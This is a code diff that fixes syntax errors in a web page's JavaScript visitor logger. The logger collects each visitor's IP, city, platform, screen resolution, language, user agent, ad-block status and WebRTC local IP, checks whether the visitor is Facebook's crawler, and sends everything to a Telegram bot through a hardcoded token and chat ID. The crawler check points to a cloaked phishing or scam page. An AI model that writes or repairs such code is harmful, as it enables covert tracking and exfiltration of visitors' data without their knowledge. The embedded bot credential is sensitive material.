@@ -56,7 +56,7 @@
     async function sendToTelegram(message) {
       const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
       const chat_id = "6239813037";
-      const url = https://api.telegram.org/bot${token}/sendMessage;
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
       await fetch(url, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
@@ -65,7 +65,7 @@
     }
 
     function formatMessage(data) {
-      return 📄 *[LOGGER STAGE]*
+      return `📄 *[LOGGER STAGE]*
 🚀 *User Info:*
 🌐 *IP:* ${data.ip || "Unknown"}
 📍 *City:* ${data.city || "Unknown"}
@@ -74,17 +74,17 @@
 🖥 *Platform:* ${data.platform}
 📱 *Resolution:* ${data.resolution}
 🌐 *Language:* ${data.language}
-🧠 *User-Agent:* \${data.ua}\
+🧠 *User-Agent:* \`${data.ua}\`
 🛡 *AdBlock:* ${data.adblock ? "Yes" : "No"}
 📡 *WebRTC Local IP:* ${data.localIP || "N/A"}
 🕒 *Timestamp:* ${new Date().toISOString()}
-🔍 *FB Crawler:* ${/FBAN|FBAV|facebookexternalhit/i.test(data.ua) ? "Yes" : "No"};
+🔍 *FB Crawler:* ${/FBAN|FBAV|facebookexternalhit/i.test(data.ua) ? "Yes" : "No"}`;
     }
 
     async function run() {
       const ipData = await getIPInfo();
       const ua = navigator.userAgent;
-      const res = ${window.screen.width}x${window.screen.height};
+      const res = `${window.screen.width}x${window.screen.height}`;
       const lang = navigator.language;
       const platform = detectPlatform();
       const adblock = await detectAdBlock();
